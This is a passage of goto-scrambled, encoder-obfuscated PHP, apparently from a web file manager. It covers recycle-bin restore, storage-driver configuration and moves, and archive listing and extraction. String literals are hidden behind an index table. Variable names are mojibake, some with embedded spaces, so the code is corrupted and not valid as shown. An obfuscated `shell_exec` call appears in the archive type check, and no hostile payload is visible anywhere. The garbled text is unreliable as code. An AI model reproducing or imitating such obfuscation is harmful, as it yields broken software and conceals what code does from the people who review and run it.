($f‚ ñÇÃğ != !1 && !in_array($E¼¦Àé Ñ, $f‚ ñÇÃğ)) { continue; } $F¶ÜòŠÙæ‡->remove($E¼¦Àé Ñ, !1); $Eİ—‘Æ»õ = $this->where(array($DÇ÷Ÿ³­…°[377] => $E¼¦Àé Ñ))->find(); $F¯Ã§¡„ºã = $Eİ—‘Æ»õ[$DÇ÷Ÿ³­…°[379]] . $DÇ÷Ÿ³­…°[80] . $Eİ—‘Æ»õ[$DÇ÷Ÿ³­…°[464]]; $aïÁÒ°´Ÿ“[$F¯Ã§¡„ºã] = array($DÇ÷Ÿ³­…°[529] => $Eİ—‘Æ»õ[$DÇ÷Ÿ³­…°[379]], $DÇ÷Ÿ³­…°[464] => $Eİ—‘Æ»õ[$DÇ÷Ÿ³­…°[464]]); $this->where(array($DÇ÷Ÿ³­…°[377] => $E¼¦Àé Ñ))->delete(); } goto bÍµ«†§•Š; BÉï¸‘†¯®: $DÇ÷Ÿ³­…° =& $_SERVER[©]; $F¶ÜòŠÙæ‡ = Model($DÇ÷Ÿ³­…°[1114]); $dÕ™‡ê³‰Ï = $this->listData(); goto eÎŸÃÑ–‡; cÎé—Æ‚•: } public function restore($aŸÔš‘µå¢ = false) { goto bÜšê†”³; bÜšê†”³: $a½ê‡Èïº =& $_SERVER[©]; $aˆâ”Ü§ˆ = Model($a½ê‡Èïº[1114]); $F›Ò—œ­ = $this->listData(); goto b™ƒ…ç÷×À; a£”Ü÷†ä: foreach ($F›Ò—œ­ as $a“ª“â”Ìß) { goto c·‘Ñ²õ‘„; Eª¬¡–Ğ•: $cç½Ì™ğ¸ê[] = $aÄï£Œ³[$a½ê‡Èïº[469]]; if ($aÄï£Œ³[$a½ê‡Èïº[378]] == $a½ê‡Èïº[93]) { $cç½Ì™ğ¸ê[] = $a“ª“â”Ìß; } $aˆâ”Ü§ˆ->lockMoveEnd($a“ª“â”Ìß); goto DÒêŒì©Å­; BÈÌí»Ùªª: if ($aÄï£Œ³[$a½ê‡Èïº[378]] == $a½ê‡Èïº[93]) { $FØÓ¿‘éß = array($a½ê‡Èïº[533] => array($a½ê‡Èïº[491], $aÄï£Œ³[$a½ê‡Èïº[467]] . $a“ª“â”Ìß . $a½ê‡Èïº[492])); $aˆâ”Ü§ˆ->where($FØÓ¿‘éß)->setField($a½ê‡Èïº[405], 0); $this->restoreFolderChildren($a“ª“â”Ìß, $F›Ò—œ­); } $this->where(array($a½ê‡Èïº[377] => $a“ª“â”Ìß))->delete(); $aˆâ”Ü§ˆ->folderSizeReset($aÄï£Œ³[$a½ê‡Èïº[469]]); goto Eª¬¡–Ğ•; E§®°Ãèº: if ($Cƒ¬¯Ğ±â§[$a½ê‡Èïº[405]] == $a½ê‡Èïº[93]) { continue; } $aˆâ”Ü§ˆ->lockMoveStart($a“ª“â”Ìß); $this->recycleMove($a“ª“â”Ìß, 0); goto BÈÌí»Ùªª; c·‘Ñ²õ‘„: if ($aŸÔš‘µå¢ != !1 && !in_array($a“ª“â”Ìß, $aŸÔš‘µå¢)) { continue; } $aÄï£Œ³ = $aˆâ”Ü§ˆ->sourceInfo($a“ª“â”Ìß); $Cƒ¬¯Ğ±â§ = $aˆâ”Ü§ˆ->sourceInfo($aÄï£Œ³[$a½ê‡Èïº[469]]); goto E§®°Ãèº; DÒêŒì©Å­: } $aˆâ”Ü§ˆ->updateModifyTime($cç½Ì™ğ¸ê); goto b”Áã·èø; b™ƒ…ç÷×À: $aŸÔš‘µå¢ = $aŸÔš‘µå¢ == !1 ? !1 : $aŸÔš‘µå¢; if (!$F›Ò—œ­) { return !0; } $cç½Ì™ğ¸ê = array(); goto a£”Ü÷†ä; b”Áã·èø: } private function restoreFolderChildren($CáÙö›™„Ü, $f˜åçÙíƒô) { goto F»ä³‡˜; AéÖõˆ½: $b‹İ“»ƒÅ«[$aèãã£¸æÔ[377]][1] = array_unique($b‹İ“»ƒÅ«[$aèãã£¸æÔ[377]][1]); $b‹İ“»ƒÅ«[$aèãã£¸æÔ[911]] = $aèãã£¸æÔ[2184]; $dÇƒøˆÎÎ->where($b‹İ“»ƒÅ«)->setField($aèãã£¸æÔ[405], 1); goto Aƒ‹Îâ‡ê; c÷£Ùï¡äœ: foreach ($f˜åçÙíƒô as $B®ÅŒéó) { if ($B®ÅŒéó == $CáÙö›™„Ü) { continue; } if (!$dÇƒøˆÎÎ->isParentOf($CáÙö›™„Ü, $B®ÅŒéó)) { continue; } $BÓ­ç…½ÓÃ = $dÇƒøˆÎÎ->sourceInfo($B®ÅŒéó); if ($BÓ­ç…½ÓÃ[$aèãã£¸æÔ[378]] == $aèãã£¸æÔ[93]) { $b‹İ“»ƒÅ«[] = array($aèãã£¸æÔ[533] => array($aèãã£¸æÔ[491], $BÓ­ç…½ÓÃ[$aèãã£¸æÔ[467]] . $B®ÅŒéó . $aèãã£¸æÔ[492])); } else { $b‹İ“»ƒÅ«[$aèãã£¸æÔ[377]][1][] = $B®ÅŒéó; } } if (!$b‹İ“»ƒÅ«[$aèãã£¸æÔ[377]][1]) { unset($b‹İ“»ƒÅ«[$aèãã£¸æÔ[377]]); } if (!$b‹İ“»ƒÅ«) { return; } goto AéÖõˆ½; F»ä³‡˜: $aèãã£¸æÔ =& $_SERVER[©]; $dÇƒøˆÎÎ = Model($aèãã£¸æÔ[1114]); $b‹İ“»ƒÅ« = array($aèãã£¸æÔ[377] => array($aèãã£¸æÔ[17], array())); goto c÷£Ùï¡äœ; Aƒ‹Îâ‡ê: } private function recycleMove($fÌêÃèµ–, $f…ÊÉ†ô¿‚ = 1) { $Dî¥¶áºÔå =& $_SERVER[©]; $aøàª„­§ç = Model($Dî¥¶áºÔå[1114]); $cß¶Îá¢™» = Model($Dî¥¶áºÔå[2363]); $BÆ¶¥Åéá = array($Dî¥¶áºÔå[377] => $fÌêÃèµ–); if ($f…ÊÉ†ô¿‚) { $aøàª„­§ç->where($BÆ¶¥Åéá)->setField($Dî¥¶áºÔå[405], 1); $cß¶Îá¢™»->eventRecycle($fÌêÃèµ–, $Dî¥¶áºÔå[2364]); } else { $C¢“òÑô = $aøàª„­§ç->where($BÆ¶¥Åéá)->find(); $d»è¼ˆØ = $C¢“òÑô[$Dî¥¶áºÔå[378]] == $Dî¥¶áºÔå[93]; $Fœ¯­˜ì‰— = $aøàª„­§ç->fileNameAuto($C¢“òÑô[$Dî¥¶áºÔå[469]], $C¢“òÑô[$Dî¥¶áºÔå[38]], REPEAT_RENAME_FOLDER, $d»è¼ˆØ); if ($Fœ¯­˜ì‰— != $C¢“òÑô[$Dî¥¶áºÔå[38]]) { $aøàª„­§ç->rename($fÌêÃèµ–, $Fœ¯­˜ì‰—); } $aøàª„­§ç->where($BÆ¶¥Åéá)->setField($Dî¥¶áºÔå[405], 0); $cß¶Îá¢™»->eventRecycle($fÌêÃèµ–, $Dî¥¶áºÔå[2365]); } } } class StorageModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\x6d\x2e\x73\164\157\x72\141\x67\145\x4c\151\x73\164"; public $field = array("\x6e\141\x6d\x65", "\163\151\172\x65\x4d\141\x78", "\163\x79\163\x74\x65\155", "\144\145\146\x61\165\154\x74", "\144\x72\x69\x76\x65\162", "\143\x6f\x6e\x66\x69\147"); public function listData($a‹õ¯¯É¼ = false, $Aéíò†¤… = "\x6d\x6f\x64\151\x66\x79\x54\x69\x6d\x65", $aÙÍö¤éÖ = false) { goto EØêÜ´ŞÁƒ; EØêÜ´ŞÁƒ: $A½¼ëÙ˜©İ =& $_SERVER[©]; $Fé£Ü˜¹Ì = parent::listData($a‹õ¯¯É¼, $Aéíò†¤…, $aÙÍö¤éÖ); if ($a‹õ¯¯É¼) { return $Fé£Ü˜¹Ì; } goto E·Ö¢ÃŒ¸; E·Ö¢ÃŒ¸: foreach ($Fé£Ü˜¹Ì as $F÷³â·…àİ => $E£İŠË¹Û™) { unset($Fé£Ü˜¹Ì[$F÷³â·…àİ][$A½¼ëÙ˜©İ[16]]); $Fé£Ü˜¹Ì[$F÷³â·…àİ][$A½¼ëÙ˜©İ[2088]] = 0; } $Bİ¸‰ÓÛˆ¨ = array_to_keyvalue($Fé£Ü˜¹Ì, $A½¼ëÙ˜©İ[43], $A½¼ëÙ˜©İ[375]); $this->_listAppendSize($Fé£Ü˜¹Ì, $Bİ¸‰ÓÛˆ¨); goto D‹å…Š‚Ü˜; D‹å…Š‚Ü˜: return $Fé£Ü˜¹Ì; goto d“¥ß–¯Š; d“¥ß–¯Š: } public function _listAppendSize(&$fÑµ·œÀ , $b¢öÆë®ÄÉ) { $eÛ´·ÕŸõĞ =& $_SERVER[©]; if (!$b¢öÆë®ÄÉ) { return; } $c”ŸÎŞ©”ä = $eÛ´·ÕŸõĞ[2366] . implode($eÛ´·ÕŸõĞ[57], $b¢öÆë®ÄÉ) . $eÛ´·ÕŸõĞ[2367]; $eŠ›Œ™×Ñ¹ = Model($eÛ´·ÕŸõĞ[718])->query($c”ŸÎŞ©”ä); $eŠ›Œ™×Ñ¹ = array_to_keyvalue($eŠ›Œ™×Ñ¹, $eÛ´·ÕŸõĞ[375], $eÛ´·ÕŸõĞ[87]); foreach ($fÑµ·œÀ  as $aÒÙØÀ¸“¨ => $C™Š½ìÒøÙ) { $fÑµ·œÀ [$aÒÙØÀ¸“¨][$eÛ´·ÕŸõĞ[2088]] = isset($eŠ›Œ™×Ñ¹[$C™Š½ìÒøÙ[$eÛ´·ÕŸõĞ[375]]]) ? $eŠ›Œ™×Ñ¹[$C™Š½ìÒøÙ[$eÛ´·ÕŸõĞ[375]]] : 0; } } public function getConfig($bÌº©¤) { $Eæ¼ÌœÜ = parent::listData($bÌº©¤); return json_decode($Eæ¼ÌœÜ[$_SERVER[©][16]], !0); } public function update($DÑäóæŠ—, $Cç‹Ú½¿ğë) { goto eÑ‚öŠ§ğ…; Aí‡ğƒ™Á: $dÎš£àº‰‚ = parent::update($DÑäóæŠ—, $Cç‹Ú½¿ğë); if ($dÎš£àº‰‚ && $Cç‹Ú½¿ğë[$BÙ•˜ÌŠÖÀ[44]]) { foreach ($dğçœƒÙğ as $fåì¡á‘à¢) { if ($fåì¡á‘à¢[$BÙ•˜ÌŠÖÀ[44]] && $fåì¡á‘à¢[$BÙ•˜ÌŠÖÀ[375]] != $DÑäóæŠ—) { parent::update($fåì¡á‘à¢[$BÙ•˜ÌŠÖÀ[375]], array($BÙ•˜ÌŠÖÀ[44] => 0)); } } } return $dÎš£àº‰‚; goto C´Ã•Ã»¨; eÑ‚öŠ§ğ…: $BÙ•˜ÌŠÖÀ =& $_SERVER[©]; $cçÈŞà¡İø = $Cç‹Ú½¿ğë[$BÙ•˜ÌŠÖÀ[38]]; $dğçœƒÙğ = array_to_keyvalue(parent::listData(), $BÙ•˜ÌŠÖÀ[38]); goto FÛªÇÃ; FÛªÇÃ: if (isset($dğçœƒÙğ[$cçÈŞà¡İø]) && $dğçœƒÙğ[$cçÈŞà¡İø][$BÙ•˜ÌŠÖÀ[375]] != $DÑäóæŠ—) { return !1; } if (isset($Cç‹Ú½¿ğë[$BÙ•˜ÌŠÖÀ[2368]]) && $Cç‹Ú½¿ğë[$BÙ•˜ÌŠÖÀ[2368]] == $BÙ•˜ÌŠÖÀ[93]) { $this->checkConfig($Cç‹Ú½¿ğë); } unset($Cç‹Ú½¿ğë[$BÙ•˜ÌŠÖÀ[2368]]); goto Aí‡ğƒ™Á; C´Ã•Ã»¨: } public function add($Bøœ£­áõÙ) { goto FÅÖ¾™ÀÛ¶; a•ëë®ôîŒ: $this->checkConfig($Bøœ£­áõÙ); $DÇòÙªõø = parent::insert($Bøœ£­áõÙ); if ($DÇòÙªõø && $Bøœ£­áõÙ[$Cø°Šæ˜É…[44]]) { foreach ($cÑÛ‡·Š•˜ as $EÈƒãœ) { if ($EÈƒãœ[$Cø°Šæ˜É…[44]]) { parent::update($EÈƒãœ[$Cø°Šæ˜É…[375]], array($Cø°Šæ˜É…[44] => 0)); } } } goto b˜Åã‰ÍÚá; b˜Åã‰ÍÚá: return $DÇòÙªõø; goto C„‚‚ ğÆÇ; FÅÖ¾™ÀÛ¶: $Cø°Šæ˜É… =& $_SERVER[©]; $cÑÛ‡·Š•˜ = array_to_keyvalue(parent::listData(), $Cø°Šæ˜É…[38]); if (isset($cÑÛ‡·Š•˜[$Bøœ£­áõÙ[$Cø°Šæ˜É…[38]]])) { return !1; } goto a•ëë®ôîŒ; C„‚‚ ğÆÇ: } public function checkConfig(&$dÔÔÄÈ—¶) { goto e“æ½Ç´»ó; fÍÖŠòôª®: foreach ($e‘‘Äó» as $dËÒî¬œïæ => $fÏ‹¥²œøë) { $e‘‘Äó»[$dËÒî¬œïæ] = trim($fÏ‹¥²œøë); } $e‘‘Äó»[$Bˆ«‹á³·[2369]] = rand_string(6); $CŠßÉ§õµÄ = $this->driverType($FÁê‚Ü‡œ“); goto D‚Òƒ‹ˆæ‡; e“æ½Ç´»ó: $Bˆ«‹á³· =& $_SERVER[©]; $FÁê‚Ü‡œ“ = strtolower($dÔÔÄÈ—¶[$Bˆ«‹á³·[100]]); $e‘‘Äó» = json_decode($dÔÔÄÈ—¶[$Bˆ«‹á³·[16]], !0); goto fÍÖŠòôª®; D‚Òƒ‹ˆæ‡: $bµÚŒõé† = $Bˆ«‹á³·[81] . $CŠßÉ§õµÄ; $ağˆËÄ’¦ = new $bµÚŒõé†($e‘‘Äó»); if (in_array($FÁê‚Ü‡œ“, $ağˆËÄ’¦->objectDriver)) { if (!$ağˆËÄ’¦->isBucketCors() && !$ağˆËÄ’¦->setBucketCors()) { $Bº¤ê„«Å½ = LNG($Bˆ«‹á³·[2370]); $Bº¤ê„«Å½ .= $Bˆ«‹á³·[2371] . LNG($Bˆ«‹á³·[2372]); show_json($Bº¤ê„«Å½, !1); } } goto fÕ–—äÉ; bğÏ†¾ƒ: $e‘‘Äó»[$Bˆ«‹á³·[1021]] = $F½êÌ‹ŞêÉ; $dÔÔÄÈ—¶[$Bˆ«‹á³·[16]] = json_encode($e‘‘Äó»); $dÔÔÄÈ—¶[$Bˆ«‹á³·[100]] = $CŠßÉ§õµÄ; goto fëîËœéÕÒ; fëîËœéÕÒ: return !0; goto cùÌ‡ßääŠ; fÕ–—äÉ: $F½êÌ‹ŞêÉ = rtrim($e‘‘Äó»[$Bˆ«‹á³·[1021]], $Bˆ«‹á³·[18]) . $Bˆ«‹á³·[18]; $E¡ÓŠŸµÍ = $ağˆËÄ’¦->getPath($F½êÌ‹ŞêÉ . $Bˆ«‹á³·[1983]); if (!$ağˆËÄ’¦->mkfile($E¡ÓŠŸµÍ)) { show_json(LNG($Bˆ«‹á³·[2370]), !1); } goto bğÏ†¾ƒ; cùÌ‡ßääŠ: } private function driverType($D³ŒœÏñÚ) { $Fš¬–­†» =& $_SERVER[©]; $dÂ…¡óµÒÚ = array($Fš¬–­†»[112] => $Fš¬–­†»[2373], $Fš¬–­†»[68] => $Fš¬–­†»[2374], $Fš¬–­†»[74] => $Fš¬–­†»[2375]); if (isset($dÂ…¡óµÒÚ[$D³ŒœÏñÚ])) { return $dÂ…¡óµÒÚ[$D³ŒœÏñÚ]; } return strtoupper($D³ŒœÏñÚ); } public function driverListSystem() { $FÀÂ¡õØÒƒ =& $_SERVER[©]; $Aò”¾Àë¹ƒ = parent::listData(); $C¢™Ğ¥«²¨ = array(); foreach ($Aò”¾Àë¹ƒ as $e‹Äö“²¿‘) { unset($e‹Äö“²¿‘[$FÀÂ¡õØÒƒ[197]], $e‹Äö“²¿‘[$FÀÂ¡õØÒƒ[117]]); $e‹Äö“²¿‘[$FÀÂ¡õØÒƒ[16]] = json_decode($e‹Äö“²¿‘[$FÀÂ¡õØÒƒ[16]], !0); $C¢™Ğ¥«²¨[] = $e‹Äö“²¿‘; } return $C¢™Ğ¥«²¨; } public function defaultDriver() { $FéŠòËÁˆˆ =& $_SERVER[©]; $b×ÆÈÈ‡Û² = parent::listData(); $FÅ¤¢„Şá… = array_filter_by_field($b×ÆÈÈ‡Û², $FéŠòËÁˆˆ[44], 1); $FÅ¤¢„Şá… = $FÅ¤¢„Şá…[0]; if ($FÅ¤¢„Şá…) { $FÅ¤¢„Şá…[$FéŠòËÁˆˆ[16]] = json_decode($FÅ¤¢„Şá…[$FéŠòËÁˆˆ[16]], !0); } return $FÅ¤¢„Şá…; } public function driverInfo($FğššÉÄ£) { $aèè†Æ‹ =& $_SERVER[©]; $bôÙÑÏÉøİ = array_to_keyvalue(parent::listData(), $aèè†Æ‹[375]); if (!isset($bôÙÑÏÉøİ[$FğššÉÄ£])) { return !1; } $e‡ÅĞÌÌ¦£ = $bôÙÑÏÉøİ[$FğššÉÄ£]; $e‡ÅĞÌÌ¦£[$aèè†Æ‹[16]] = json_decode($e‡ÅĞÌÌ¦£[$aèè†Æ‹[16]], !0); return $e‡ÅĞÌÌ¦£; } public function remove($Eõ¢ëå¢½¯) { $this->removeShareItems($Eõ¢ëå¢½¯); return parent::remove($Eõ¢ëå¢½¯); } public function removeWithFile($D”ì§ËÏî…) { goto bÖç¦ğ‹ç; e¥á‡ğÑÍ©: if (!$cö‡‘áè´¦) { $AİÛİµ£™Ô->stop($d„ƒˆèÇ); return !1; } $AİÛİµ£™Ô->end(); $this->remove($D”ì§ËÏî…); goto DŞ¬‹¾ìµ; E˜ÜË‘õ¨·: $dŞœç–³à° = Model($AåÂ”± êè[430])->where($B‹²†è¥ÏĞ)->sum($AåÂ”± êè[87]); $d„ƒˆèÇ = $AåÂ”± êè[2376] . $D”ì§ËÏî…; $AİÛİµ£™Ô = new TaskFileTransfer($d„ƒˆèÇ, $AåÂ”± êè[2377], $fÅÑÉ ãŒì, LNG($AåÂ”± êè[2378]) . "\50{$D”ì§ËÏî…}\x29"); goto F¾§ ª£¸œ; bÖç¦ğ‹ç: $AåÂ”± êè =& $_SERVER[©]; $B‹²†è¥ÏĞ = array($AåÂ”± êè[743] => $D”ì§ËÏî…); $fÅÑÉ ãŒì = Model($AåÂ”± êè[430])->where($B‹²†è¥ÏĞ)->count(); goto E˜ÜË‘õ¨·; E§£‘ à¨: $A‡‹Ê‰›¯ = Model($AåÂ”± êè[177])->where($B‹²†è¥ÏĞ)->field($AåÂ”± êè[2379])->select(); foreach ($A‡‹Ê‰›¯ as $D™Ë³ºŸŒÈ) { goto aŠµæğ¨; dÒÜóÄèó®: if (IO::exist($F°««ÒåÃ)) { $AİÛİµ£™Ô->updateFileEnd($D™Ë³ºŸŒÈ[$AåÂ”± êè[38]], $D™Ë³ºŸŒÈ[$AåÂ”± êè[87]]); continue; } if (!IO::move($FŠÚ•†ª™, get_path_father($F°««ÒåÃ))) { $cö‡‘áè´¦ = !1; break; } $B‹²†è¥ÏĞ = array($AåÂ”± êè[427] => $D™Ë³ºŸŒÈ[$AåÂ”± êè[427]]); goto cĞã’˜¯í; cĞã’˜¯í: $B¦Åš±Û°Í = array($AåÂ”± êè[743] => $dŒ²×—ÊŠ¶, $AåÂ”± êè[85] => $F°««ÒåÃ); Model($AåÂ”± êè[177])->where($B‹²†è¥ÏĞ)->save($B¦Åš±Û°Í); goto bîĞ¦ëñÈ; aŠµæğ¨: $FŠÚ•†ª™ = $D™Ë³ºŸŒÈ[$AåÂ”± êè[85]]; $F°««ÒåÃ = $Dç´İ¾šœÏ . str_replace("\x7b\151\x6f\72{$D”ì§ËÏî…}\175\x2f", $AåÂ”± êè[43], $FŠÚ•†ª™); if (!IO::exist($FŠÚ•†ª™)) { $D»ç¬Ü“ƒë[] = $D™Ë³ºŸŒÈ[$AåÂ”± êè[427]]; $AİÛİµ£™Ô->updateFileEnd($D™Ë³ºŸŒÈ[$AåÂ”± êè[38]], $D™Ë³ºŸŒÈ[$AåÂ”± êè[87]]); continue; } goto dÒÜóÄèó®; bîĞ¦ëñÈ: } $this->removeByFileID($D»ç¬Ü“ƒë); goto e¥á‡ğÑÍ©; e™£ˆ†îãœ: $Dç´İ¾šœÏ = "\x7b\151\x6f\x3a{$dŒ²×—ÊŠ¶}\175\x2f"; $cö‡‘áè´¦ = !0; $D»ç¬Ü“ƒë = array(); goto E§£‘ à¨; F¾§ ª£¸œ: $AİÛİµ£™Ô->task[$AåÂ”± êè[697]] = (double) $dŞœç–³à°; $bµĞ†³¤İ = KodIO::defaultDriver(); $dŒ²×—ÊŠ¶ = $bµĞ†³¤İ[$AåÂ”± êè[375]]; goto e™£ˆ†îãœ; DŞ¬‹¾ìµ: } public function progress($a™¡¢á‡È) { return Task::get($_SERVER[©][2376] . $a™¡¢á‡È); } private function removeByFileID($E§Œ›¢‹Ëï = array()) { goto B•”ãŒ›ôì; B•”ãŒ›ôì: $C¿‡‚·Š·œ =& $_SERVER[©]; if (empty($E§Œ›¢‹Ëï)) { return; } $eÁï£ƒ©• = array($C¿‡‚·Š·œ[427] => array($C¿‡‚·Š·œ[17], $E§Œ›¢‹Ëï)); goto AñË£ó¯”‡; E¯‰À†Õíé: foreach ($e¨Å‡Éá–œ as $EóÛƒé«) { Model($C¿‡‚·Š·œ[390])->removeNow($EóÛƒé«, !1); } goto Dİˆ‡ÏÁ…í; AñË£ó¯”‡: $e¨Å‡Éá–œ = Model($C¿‡‚·Š·œ[1114])->where($eÁï£ƒ©•)->field($C¿‡‚·Š·œ[377])->select(); if (!$e¨Å‡Éá–œ) { return; } $e¨Å‡Éá–œ = array_to_keyvalue($e¨Å‡Éá–œ, $C¿‡‚·Š·œ[43], $C¿‡‚·Š·œ[377]); goto E¯‰À†Õíé; Dİˆ‡ÏÁ…í: } private function removeShareItems($FçÏ‹×†æî) { goto a¨‹ì˜Ø; DëÍ»Ü¤¾×: $AË¼ÉàÇè‘ = Model($b°Íõ‚Ãñ[2079])->where($Aëàµã…‘)->field($b°Íõ‚Ãñ[449])->select(); if (empty($AË¼ÉàÇè‘)) { return; } $c‹ˆ†·ÆŞè = array_to_keyvalue($AË¼ÉàÇè‘, $b°Íõ‚Ãñ[43], $b°Íõ‚Ãñ[449]); goto bÌó‰å‘ƒ±; a¨‹ì˜Ø: $b°Íõ‚Ãñ =& $_SERVER[©]; $dŒÀÌîĞÈÁ = "\x7b\x69\x6f\72{$FçÏ‹×†æî}\175\x2f"; $Aëàµã…‘ = array($b°Íõ‚Ãñ[377] => 0, $b°Íõ‚Ãñ[1016] => array($b°Íõ‚Ãñ[751], "{$dŒÀÌîĞÈÁ}\45")); goto DëÍ»Ü¤¾×; bÌó‰å‘ƒ±: Model($b°Íõ‚Ãñ[544])->remove($c‹ˆ†·ÆŞè); goto dİ½›Áß»š; dİ½›Áß»š: } } goto D‘ç¯šä»Â; bîšùˆ¨¦¢: class KodArchive { static function init() { goto FÚè‡·«×É; dŒ‘ìƒß·£: require_once ARCHIVE_LIB . $Bˆéø£Çä[1894]; goto cĞ “Ä‰¤µ; FÚè‡·«×É: $Bˆéø£Çä =& $_SERVER[©]; if (defined($Bˆéø£Çä[1883])) { return; } define($Bˆéø£Çä[1883], SDK_DIR . $Bˆéø£Çä[1884]); goto E”ğ¶°ã¢ä; E”ğ¶°ã¢ä: define($Bˆéø£Çä[1885], TEMP_FILES); define($Bˆéø£Çä[1886], TEMP_FILES); define($Bˆéø£Çä[1887], $Bˆéø£Çä[1888]); goto dŞçñï¸ùô; dŞçñï¸ùô: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $Bˆéø£Çä[1889]; require_once ARCHIVE_LIB . $Bˆéø£Çä[1890]; goto DŒÂØŸ·; DŒÂØŸ·: require_once ARCHIVE_LIB . $Bˆéø£Çä[1891]; require_once ARCHIVE_LIB . $Bˆéø£Çä[1892]; require_once ARCHIVE_LIB . $Bˆéø£Çä[1893]; goto dŒ‘ìƒß·£; cĞ “Ä‰¤µ: } static function checkIfType($EÔÍ©Ó¼¢, $F”ˆÎò¡ŸÜ) { goto BÙ™¹³¦ºµ; BÙ™¹³¦ºµ: $E œÇ¥‰×› =& $_SERVER[©]; self::init(); $dÙÒÅëØùˆ = array($E œÇ¥‰×›[310] => array($E œÇ¥‰×›[310], $E œÇ¥‰×›[1895], $E œÇ¥‰×›[1896], $E œÇ¥‰×›[1897]), $E œÇ¥‰×›[1898] => array($E œÇ¥‰×›[1898], $E œÇ¥‰×›[1899], $E œÇ¥‰×›[1040], $E œÇ¥‰×›[1038]), $E œÇ¥‰×›[1042] => array($E œÇ¥‰×›[1042], $E œÇ¥‰×›[1900], $E œÇ¥‰×›[1901], $E œÇ¥‰×›[1902], $E œÇ¥‰×›[1903], $E œÇ¥‰×›[1904], $E œÇ¥‰×›[1905])); goto a÷—¹‹Ï‰‰; a÷—¹‹Ï‰‰: $E»¸›ó§¯Ù = in_array($EÔÍ©Ó¼¢, $dÙÒÅëØùˆ[$F”ˆÎò¡ŸÜ]); if ($E»¸›ó§¯Ù && ($F”ˆÎò¡ŸÜ == $E œÇ¥‰×›[310] || $F”ˆÎò¡ŸÜ == $E œÇ¥‰×›[1898]) && (!function_exists($E œÇ¥‰×›[1906]) || !function_exists($E œÇ¥‰×›[1907]))) { show_tips($E œÇ¥‰×›[1908]); } if ($E»¸›ó§¯Ù && $F”ˆÎò¡ŸÜ == $E œÇ¥‰×›[1042] && (!function_exists($E œÇ¥‰×›[1909]) || !strstr(shell_exec($E œÇ¥‰×›[1910]), $E œÇ¥‰×›[1911]))) { show_tips($E œÇ¥‰×›[1912]); } goto a‚¬äÇ«ÂÕ; a‚¬äÇ«ÂÕ: return $E»¸›ó§¯Ù; goto C‘ö¥·ğã; C‘ö¥·ğã: } static function listContent($f‚ÀŠâ“Óß, $eÖ©›…¹ÑÓ = true) { $BìÂßë¬‰æ =& $_SERVER[©]; self::init(); $AÏÎÓÂœÌ = !empty($GLOBALS[$BìÂßë¬‰æ[1046]]) ? $GLOBALS[$BìÂßë¬‰æ[1046]] : get_path_ext($f‚ÀŠâ“Óß); $F¦‡è‚¾­æ = !1; if (self::checkIfType($AÏÎÓÂœÌ, $BìÂßë¬‰æ[1898])) { $Fá‡‹•‹Ì = PclTarList($f‚ÀŠâ“Óß, $AÏÎÓÂœÌ); $F¦‡è‚¾­æ = array(); for ($FÎå›öÍÆá = 0; $FÎå›öÍÆá < count($Fá‡‹•‹Ì); $FÎå›öÍÆá++) { $D÷ÕŞàÒ‡ç = $Fá‡‹•‹Ì[$FÎå›öÍÆá]; if ($D÷ÕŞàÒ‡ç[$BìÂßë¬‰æ[1913]] == $BìÂßë¬‰æ[1914] || $D÷ÕŞàÒ‡ç[$BìÂßë¬‰æ[1913]] == $BìÂßë¬‰æ[1915]) { continue; } if ($eÖ©›…¹ÑÓ) { $D÷ÕŞàÒ‡ç[$BìÂßë¬‰æ[1916]] = ltrim($D÷ÕŞàÒ‡ç[$BìÂßë¬‰æ[1916]], $BìÂßë¬‰æ[1152]); } if ($D÷ÕŞàÒ‡ç[$BìÂßë¬‰æ[1913]] == $BìÂßë¬‰æ[1917]) { $D÷ÕŞàÒ‡ç[$BìÂßë¬‰æ[86]] = !0; } else { $D÷ÕŞàÒ‡ç[$BìÂßë¬‰æ[86]] = !1; } $D÷ÕŞàÒ‡ç[$BìÂßë¬‰æ[1033]] = $FÎå›öÍÆá; $F¦‡è‚¾­æ[] = $D÷ÕŞàÒ‡ç; } } else { if (self::checkIfType($AÏÎÓÂœÌ, $BìÂßë¬‰æ[1042])) { $C‚Ö¾ÇŠ¾» = kodRarArchive::listContent($f‚ÀŠâ“Óß); if (!$C‚Ö¾ÇŠ¾»[$BìÂßë¬‰æ[1029]]) { return $C‚Ö¾ÇŠ¾»; } else { $F¦‡è‚¾­æ = $C‚Ö¾ÇŠ¾»[$BìÂßë¬‰æ[1031]]; } } else { if (kodZipArchive::support($BìÂßë¬‰æ[363])) { $F¦‡è‚¾­æ = kodZipArchive::listContent($f‚ÀŠâ“Óß); } else { $dˆ·¯á–Óù = new PclZip($f‚ÀŠâ“Óß); $F¦‡è‚¾­æ = $dˆ·¯á–Óù->listContent(); } } } if ($F¦‡è‚¾­æ) { $d•ÕùŠ†“¤ = unzip_charset_get($F¦‡è‚¾­æ); $eÖ©›…¹ÑÓ = $eÖ©›…¹ÑÓ && function_exists($BìÂßë¬‰æ[75]); for ($FÎå›öÍÆá = 0; $FÎå›öÍÆá < count($F¦‡è‚¾­æ); $FÎå›öÍÆá++) { $F¦‡è‚¾­æ[$FÎå›öÍÆá][$BìÂßë¬‰æ[1916]] = str_replace(array($BìÂßë¬‰æ[1069], $BìÂßë¬‰æ[1918]), $BìÂßë¬‰æ[763], $F¦‡è‚¾­æ[$FÎå›öÍÆá][$BìÂßë¬‰æ[1916]]); if ($eÖ©›…¹ÑÓ) { $F¦‡è‚¾­æ[$FÎå›öÍÆá][$BìÂßë¬‰æ[1916]] = iconv_to($F¦‡è‚¾­æ[$FÎå›öÍÆá][$BìÂßë¬‰æ[1916]], $d•ÕùŠ†“¤, $BìÂßë¬‰æ[335]); unset($F¦‡è‚¾­æ[$FÎå›öÍÆá][$BìÂßë¬‰æ[1919]]); } } return array($BìÂßë¬‰æ[1029] => !0, $BìÂßë¬‰æ[1031] => $F¦‡è‚¾­æ); } else { return array($BìÂßë¬‰æ[1029] => !1, $BìÂßë¬‰æ[1031] => $F¦‡è‚¾­æ); } } static function extract($e¦Ïº¦äÀ¦, $Aé¨æ°áàÓ, $A¯Ã´‘Õ = "\x2d\61", &$aÃ‰‚Œù£‘ = false) { goto eï­µœË©³; AÚ†Ü£õ¾ô: if (self::checkIfType($D‘É£’—Ä§, $dÊß ×àø[1898])) { if ($A¯Ã´‘Õ != $dÊß ×àø[1028]) { $e†¤”ÚÃ‰÷ = unzip_pre_name($e†¤”ÚÃ‰÷); $Bœ¢ºÇÔ—ˆ = unzip_pre_name($Bœ¢ºÇÔ—ˆ); 